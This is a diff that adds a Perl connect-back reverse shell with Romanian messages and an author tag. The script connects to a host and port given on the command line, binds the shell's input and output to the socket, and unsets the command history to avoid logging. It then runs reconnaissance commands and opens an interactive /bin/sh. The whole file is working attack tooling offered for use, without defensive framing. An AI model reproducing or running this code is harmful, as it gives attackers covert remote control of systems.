@@ -1,0 +1,25 @@
+#!/usr/bin/perl
+use Socket;
+print "\n[0;33m[~] Incerc sa fac legatura =)[0m\n";
+$host = $ARGV[0];
+$port = 8080;
+if ($ARGV[1]) {
+  $port = $ARGV[1];
+}
+$proto = getprotobyname('tcp') || die("[0;31m[-] Nu merge treaba[0m\n\n");
+socket(SERVER, PF_INET, SOCK_STREAM, $proto) || die ("[0;31m[-] Eroare socket[0m\n\n");
+my $target = inet_aton($host);
+if (!connect(SERVER, pack "SnA4x8", 2, $port, $target)) {
+  die("[0;31m[-] Conecktback Esuat[0m\n\n");
+}
+if (!fork( )) {
+  open(STDIN,">&SERVER");
+  open(STDOUT,">&SERVER");
+  open(STDERR,">&SERVER");
+  print "[+] [0;32mConectback by [0;36msTrEs[0;32m ... private version 
+=)[0m\n"; 
+  system("unset HISTFILE; unset HISTSAVE ; uname -a ; id ; w ; echo \"[+] [0;32mTime to burn...[0m\";echo \"[+] [0;31mDo not fucking press Ctrl C[0m\"; /bin/sh -i");
+  exit(0);
+}
+print "[0;32m[+] Conectback Reusit ![0m\n\n";
+
